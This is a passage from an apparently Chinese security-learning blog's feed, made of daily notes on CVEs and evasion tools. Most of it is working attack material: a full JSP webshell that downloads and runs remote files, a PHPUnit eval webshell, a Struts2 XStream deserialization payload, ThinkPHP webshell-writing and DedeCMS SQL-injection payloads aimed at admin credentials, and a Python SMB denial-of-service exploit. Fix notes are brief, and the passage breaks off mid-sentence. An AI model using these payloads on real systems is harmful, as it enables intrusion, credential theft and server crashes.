    <content type="html"><![CDATA[<p><img src="http://www.xt996.top/muggle/2020/03/23/3.23/nice.png"></p><p>学习免杀工具、注册表修改时间、CVE漏洞、流量分析</p><span id="more"></span><h1 id="Xencrypt-免杀powershell"><a href="#Xencrypt-免杀powershell" class="headerlink" title="Xencrypt(免杀powershell)"></a>Xencrypt(免杀powershell)</h1><p>一款基于PowerShell脚本实现的反病毒绕过工具(免杀powershell)</p><blockquote><p><a href="https://github.com/the-xentropy/xencrypt">https://github.com/the-xentropy/xencrypt</a></p></blockquote><p>这里有稍微详细一点的教程</p><blockquote><p><a href="https://blog.csdn.net/lhh134/article/details/104640758">https://blog.csdn.net/lhh134/article/details/104640758</a></p></blockquote><h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><h2 id="注册表文件路径"><a href="#注册表文件路径" class="headerlink" title="注册表文件路径"></a>注册表文件路径</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\config</span><br></pre></td></tr></table></figure><p>文件导出，注册表打开该目录下SYSTEM等文件查看</p><h2 id="查看注册表中某一项修改时间"><a href="#查看注册表中某一项修改时间" class="headerlink" title="查看注册表中某一项修改时间"></a>查看注册表中某一项修改时间</h2><p>第三方注册表工具 例如:Registry Workshop</p><p>打开即可查看修改时间</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>PUT &#x2F;FxCodeShell.jsp%20 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.Arrays&quot;%&gt;</span><br><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String view = request.getParameter(&quot;view&quot;);</span><br><span class="line">    if (view == null || view.equals(&quot;&quot;)) &#123;</span><br><span class="line">        String localOS = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">        List&lt;String&gt; osList;</span><br><span class="line">        String tomcatOS = &quot;0&quot;;</span><br><span class="line">        String DEFAULT = &quot;0&quot;;</span><br><span class="line">        String WINDOWS = &quot;1&quot;;</span><br><span class="line">        String LINUX = &quot;2&quot;;</span><br><span class="line">        osList = new ArrayList&lt;String&gt;();</span><br><span class="line">        osList.add(&quot;Linux&quot;);</span><br><span class="line">        osList.add(&quot;Windows&quot;);</span><br><span class="line">        for (String os : osList) &#123;</span><br><span class="line">            if (localOS.contains(os)) &#123;</span><br><span class="line">                if (os.equals(&quot;Linux&quot;)) &#123;</span><br><span class="line">                    tomcatOS = LINUX;</span><br><span class="line">                &#125; else if (os.equals(&quot;Windows&quot;)) &#123;</span><br><span class="line">                    tomcatOS = WINDOWS;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    tomcatOS = DEFAULT;</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        out.write(tomcatOS + &quot;&lt;br/&gt;&quot;);</span><br><span class="line">        response.setHeader(&quot;OS&quot;, tomcatOS);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String password = &quot;FxxkMyLie1836710Aa&quot;;</span><br><span class="line">    if (!view.equals(password)) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    int systemCode = Integer.parseInt(request.getParameter(&quot;os&quot;));</span><br><span class="line">    String address = request.getParameter(&quot;address&quot;);</span><br><span class="line">    String fileName = null;</span><br><span class="line">    String path = null;</span><br><span class="line">    String winPath = &quot;%SystemRoot%/Temp/&quot;;</span><br><span class="line">    String linuxPath = &quot;/var/tmp/&quot;;</span><br><span class="line">    switch (systemCode) &#123;</span><br><span class="line">    case 1:</span><br><span class="line">        path = winPath;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        path = linuxPath;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String[] urls = address.split(&quot;,&quot;);</span><br><span class="line">    InputStream fileInputSteam = null;</span><br><span class="line">    FileOutputStream fileOutputStream = null;</span><br><span class="line">    for (int i = 0; i &lt;= urls.length - 1; i++) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String[] file = urls[i].split(&quot;/&quot;);</span><br><span class="line">            fileName = file[file.length - 1];</span><br><span class="line">            out.write(&quot;Download:&quot; + urls[i] + &quot;&lt;br&gt;&quot;);</span><br><span class="line">            out.write(&quot;&lt;br&gt;filename:&quot; + fileName + &quot;&lt;br&gt;&quot;);</span><br><span class="line">            out.write(&quot;&lt;br&gt;Size:&quot; + urls.length + &quot;&lt;br&gt;&quot;);</span><br><span class="line">            out.write(</span><br><span class="line">                    &quot;-------------------------------------------------------------------------------------------------------&quot;</span><br><span class="line">                            + &quot;&lt;br&gt;&lt;br&gt;&quot;);</span><br><span class="line">            File isfile = new File(path + fileName);</span><br><span class="line">            if (isfile.isFile()) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Runtime exec = Runtime.getRuntime();</span><br><span class="line">                    if (systemCode == 1) &#123;</span><br><span class="line">                        exec.exec(path + fileName);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        String chmod = &quot;chmod 777 &quot; + path + fileName;</span><br><span class="line">                        exec.exec(chmod);</span><br><span class="line">                        exec.exec(&quot;nohup &quot; + path + fileName + &quot; &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (Exception e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            URL downloadUrl = new URL(urls[i]);</span><br><span class="line">            HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();</span><br><span class="line">            conn.setConnectTimeout(60000 * 3);</span><br><span class="line">            conn.setReadTimeout(60000 * 3);</span><br><span class="line">            fileInputSteam = conn.getInputStream();</span><br><span class="line">            fileOutputStream = new FileOutputStream(path + fileName);</span><br><span class="line">            int length = -1;</span><br><span class="line">            byte[] b = new byte[409600];</span><br><span class="line">            while ((length = fileInputSteam.read(b)) != -1) &#123;</span><br><span class="line">                fileOutputStream.write(b, 0, length);</span><br><span class="line">                fileOutputStream.flush();</span><br><span class="line">            &#125;</span><br><span class="line">            if (conn != null) &#123;</span><br><span class="line">                conn.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line">            if (fileInputSteam != null) &#123;</span><br><span class="line">                fileInputSteam.close();</span><br><span class="line">            &#125;</span><br><span class="line">            if (fileOutputStream != null) &#123;</span><br><span class="line">                fileOutputStream.close();</span><br><span class="line">            &#125;</span><br><span class="line">            Runtime exec = Runtime.getRuntime();</span><br><span class="line">            if (systemCode == 1) &#123;</span><br><span class="line">                exec.exec(path + fileName);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                String chmod = &quot;chmod 777 &quot; + path + fileName;</span><br><span class="line">                exec.exec(chmod);</span><br><span class="line">                exec.exec(&quot;nohup &quot; + path + fileName + &quot; &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h1 id="CVE-2017-5638"><a href="#CVE-2017-5638" class="headerlink" title="CVE-2017-5638"></a>CVE-2017-5638</h1><p>漏洞简介</p><p>Apache Struts是一套用于创建企业级Java Web 应用的开源MVC框架 。<br>Apache Struts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。<br>漏洞编号：S2-045<br>CVE编号：CVE-2017-5638<br>漏洞类型：远程代码执行<br>漏洞级别：高危<br>漏洞风险：黑客通过利用漏洞可以实现远程命令执行。<br>影响版本：struts2.3.5 – struts2.3.31 , struts2.5 – struts2.5.10</p><h1 id="CVE-2017-9841"><a href="#CVE-2017-9841" class="headerlink" title="CVE-2017-9841"></a>CVE-2017-9841</h1><p>php unit 漏洞复现</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述:"></a>漏洞概述:</h2><p>PHPUnit 是 PHP 程式语言中最常见的单元测试 (unit testing) 框架，通常phpunit使用composer非常流行的PHP依赖管理器进行部署,将会在当前目录创建一个vendor文件夹.phpunit生产环境中仍然安装了它,如果该编写器模块存在于Web可访问目录，则存在远程代码执行漏洞。</p><h2 id="漏洞版本："><a href="#漏洞版本：" class="headerlink" title="漏洞版本："></a>漏洞版本：</h2><p>4.8.19 ~ 4.8.27<br>5.0.10 ~ 5.6.2</p><h2 id="基本原理："><a href="#基本原理：" class="headerlink" title="基本原理："></a>基本原理：</h2><p>漏洞位于<code>/phpunit/src/Util/PHP/eval-stdin.php</code>。</p><p><code>eval(&#39;?&gt;&#39;.file_get_contents(&#39;php://input&#39;));</code></p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>总体来说就是向<code>vendor/phpunit/src/Util/PHP/eval-stdin.php</code>发送POST请求执行php代码。<br>例如直接执行phpinfo在这里插入图片描述在这里插入图片描述<br>也可以直接写入一句话木马。<code>&lt;?=file_put_contents(&quot;1.php&quot;, &#39;&lt;?=eval($_REQUEST[1]);?&gt;&#39;);</code><br>在这里插入图片描述成功生成，即可菜刀连接。<br>在这里插入图片描述</p><h2 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h2><p>果断一点，生产环境中直接删掉phpunit，没有用。</p><p>如果不想删，念旧情，直接升级吧，</p><p>懒打升级？那就直接设置权限，禁止访问该目录。</p><h1 id="CVE-2017-9805-S2-052-漏洞复现"><a href="#CVE-2017-9805-S2-052-漏洞复现" class="headerlink" title="CVE-2017-9805(S2-052)漏洞复现"></a>CVE-2017-9805(S2-052)漏洞复现</h1><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache Struts2的REST插件存在远程代码执行的高危漏洞,Struts2 REST插件的XStream插件的XStream组件存在反序列化漏洞,使用XStream组件对XML格式的数据包进行反序列化操作时,未对数据内容进行有效验证,存在安全隐患,可被远程攻击。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据Content-Type或URI扩展名来判断用户传入的数据包类型</p><p>根据漏洞原理，仅需要POST相应xml数据即可不需要考虑特定的url 因此构造poc</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33</p><p>Struts 2.5 - Struts 2.5.12</p><h2 id="漏洞环境搭建以及复现"><a href="#漏洞环境搭建以及复现" class="headerlink" title="漏洞环境搭建以及复现"></a>漏洞环境搭建以及复现</h2><p>1、利用docker搭建vulhub漏洞环境</p><p>docker-compose up -d</p><p>　　</p><p>2、启动环境后,访问<code>http://172.17.0.1:8080/orders.xhtml</code>,可以看到showcase页面。</p><p>　　</p><p>3、由于rest-plugin会根据URI扩展名或 Content-Type来判断解析方法, 所以我们只需要修改orders.xhtml或修改Content-Type头为application&#x2F;xml,即可在Body中传递XML数据。</p><p>3.1点击一个edit进行编译页面,burpsuit抓包</p><p>　　</p><p>3.2修改数据包,构造数据包</p><p>将Content-Type:application&#x2F;x-www-form-urlencoded修改为:Content-Type:application&#x2F;xml</p><p>Post数据修改成:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">&lt;entry&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">       &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">       &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">         &lt;dataHandler&gt;</span><br><span class="line">           &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">             &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">               &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                 &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                 &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                 &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                   &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                     &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                     &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                       &lt;command&gt;</span><br><span class="line">&lt;string&gt;touch&lt;/string&gt;</span><br><span class="line">&lt;string&gt;/tmp/test.txt&lt;/string&gt;</span><br><span class="line">                       &lt;/command&gt;</span><br><span class="line">                       &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                     &lt;/next&gt;</span><br><span class="line">                   &lt;/iter&gt;</span><br><span class="line">                   &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                     &lt;method&gt;</span><br><span class="line">                       &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                       &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                       &lt;parameter-types/&gt;</span><br><span class="line">                     &lt;/method&gt;</span><br><span class="line">                     &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                   &lt;/filter&gt;</span><br><span class="line">                   &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                 &lt;/serviceIterator&gt;</span><br><span class="line">                 &lt;lock/&gt;</span><br><span class="line">               &lt;/cipher&gt;</span><br><span class="line">               &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">               &lt;ibuffer/&gt;</span><br><span class="line">               &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">               &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">               &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">               &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">             &lt;/is&gt;</span><br><span class="line">             &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">           &lt;/dataSource&gt;</span><br><span class="line">           &lt;transferFlavors/&gt;</span><br><span class="line">         &lt;/dataHandler&gt;</span><br><span class="line">         &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">       &lt;/value&gt;</span><br><span class="line">     &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">   &lt;/entry&gt;</span><br><span class="line">   &lt;entry&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">     &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">   &lt;/entry&gt;</span><br><span class="line"> &lt;/map&gt;</span><br></pre></td></tr></table></figure><p>4、<strong>可以看到响应500状态码,不过还是成功了</strong></p><p>　　</p><p>5、在目标执行docker-compose exec struts2 ls &#x2F;tmp&#x2F; 查看是否成功执行touch命令</p><p>　　</p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、 升级版本</p><p>2、 删除Struts2 REST插件,或仅限于服务器普通页面和jsons:</p><p><code>&lt;constant name=&quot;struts.action.extension&quot; value=&quot;xhtml,json&quot;/&gt;</code></p><p>3、限制服务端扩展类型,删除XML支持。</p><h1 id="看到的一些payload"><a href="#看到的一些payload" class="headerlink" title="看到的一些payload"></a>看到的一些payload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\template\driver\file/write&amp;cacheFile=robots1.php&amp;content=xbshell&lt;?php%20@eval($_POST[admin]);?&gt;</span><br><span class="line"></span><br><span class="line">/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=12345.php&amp;vars[1][1]=&lt;?php%20$poc%20=&quot;axsxsxexrxt&quot;;$poc_1%20=%20explode(&quot;x&quot;,%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST[&#x27;12345&#x27;]))));?&gt;</span><br><span class="line"></span><br><span class="line">/?s=index/\think\template\driver\file/write&amp;cacheFile=robots.php&amp;content=xbshell1&lt;?php$password%20=%20&quot;xinba&quot;;$ch%20=%20explode(&quot;.&quot;,&quot;hello.ass.world.er.t&quot;);array_intersect_ukey(array($_REQUEST[$password]%20=&gt;%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?&gt;</span><br><span class="line"></span><br><span class="line">/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[%27fuck%27]);&amp;fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));</span><br><span class="line"></span><br><span class="line">/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294 HTTP/1.1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://godkey111fw.hk1008.webhost6.cn/hmseo.txt?.php#.jpg</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;http://www.xt996.top/muggle/2020/03/23/3.23/nice.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;学习免杀工具、注册表修改时间、CVE漏洞、流量分析&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="注册表" scheme="http://example.com/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>3-20</title>
    <link href="http://example.com/2020/03/20/3.20/"/>
    <id>http://example.com/2020/03/20/3.20/</id>
    <published>2020-03-20T02:32:15.000Z</published>
    <updated>2020-03-20T10:12:21.436Z</updated>
    
    <content type="html"><![CDATA[<p>慢慢积累，慢慢学习</p><span id="more"></span><h1 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h1><p>Tomcat-Ajp协议文件读取漏洞</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><h2 id="批量扫描工具"><a href="#批量扫描工具" class="headerlink" title="批量扫描工具"></a>批量扫描工具</h2><p>python2多线程扫描Tomcat-Ajp协议文件读取漏洞<br><a href="https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner">https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li>tomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip</li><li>tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性。可以通过此种特性从而可以控制request对象的下面三个Attribute属性<br>javax.servlet.include.request_uri<br>javax.servlet.include.path_info<br>javax.servlet.include.servlet_path</li><li>再通过控制ajp控制的上述三个属性来读取文件,通过操控上述三个属性从而可以读取到应用目录下的任何文件。</li></ul><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>执行poc代码，按照语法规范输入靶机IP</p><h1 id="CVE-2018-0833"><a href="#CVE-2018-0833" class="headerlink" title="CVE-2018-0833"></a>CVE-2018-0833</h1><p>SMB空指针引用攻击</p><p><a href="https://bbs.pediy.com/thread-225172.htm">https://bbs.pediy.com/thread-225172.htm</a></p><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><p><a href="https://github.com/RealBearcat/CVE-2018-0833/blob/master/poc.py">https://github.com/RealBearcat/CVE-2018-0833/blob/master/poc.py</a><br><a href="https://www.exploit-db.com/exploits/44189">https://www.exploit-db.com/exploits/44189</a></p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>服务器信息块（SMB）是一个网络文件共享协议，它允许应用程序和终端用户从远端的文件服务器访问文件资源。这个崩溃发生的模块是“mrxsmb”。这是一个微软服务器消息块(SMB)的重定向器。Windows 8.1和Windows server 2012 R2存在该漏洞，在Windows 8.1 (x86)上执行，发送一个精心构造的数据包，因为它想要从地址0x00000030的内存中读取一个受保护的(空页保护)值，该值处于受保护的内存空间，会引起内核的处理异常，迫使机器重启造成拒绝服务。</p><h2 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Exploit Title: Microsoft Windows SMB Client Null Pointer Dereference Denial of Service</span><br><span class="line"># Date: 26/02/2018</span><br><span class="line"># Exploit Author: Nabeel Ahmed</span><br><span class="line"># Version: SMBv3</span><br><span class="line"># Tested on: Windows 8.1 (x86), Windows Server 2012 R2 (x64)</span><br><span class="line"># CVE : CVE-2018-0833</span><br><span class="line"></span><br><span class="line">import SocketServer</span><br><span class="line">from binascii import unhexlify</span><br><span class="line">payload = &#x27;000000ecfd534d4241414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141&#x27;</span><br><span class="line">class byebye(SocketServer.BaseRequestHandler):</span><br><span class="line">        def handle(self):</span><br><span class="line">                try:</span><br><span class="line">                        print &quot;From:&quot;, self.client_address</span><br><span class="line">                        print &quot;[*]Sending Payload...&quot;</span><br><span class="line">                        self.request.send(unhexlify(payload))</span><br><span class="line">                except Exception:</span><br><span class="line">                        print &quot;BSoD Triggered on&quot;, self.client_address</span><br><span class="line">                        pass</span><br><span class="line">SocketServer.TCPServer.allow_reuse_address = 1</span><br><span class="line">launch = SocketServer.TCPServer((&#x27;&#x27;, 445),byebye)</span><br><span class="line">launch.serve_forever()</span><br><span class="line">            </span><br></pre></td></tr></table></figure><h2 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h2><p>攻击机执行poc代码，靶机访问&#x2F;&#x2F;攻击机IP，靶机蓝屏</p><h1 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h1><blockquote><p><a href="https://www.freebuf.com/vuls/228735.html">https://www.freebuf.com/vuls/228735.html</a></p><p><a href="https://www.freebuf.com/vuls/228681.html">https://www.freebuf.com/vuls/228681.html</a></p></blockquote><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞产生的主要原因就是在Exchange 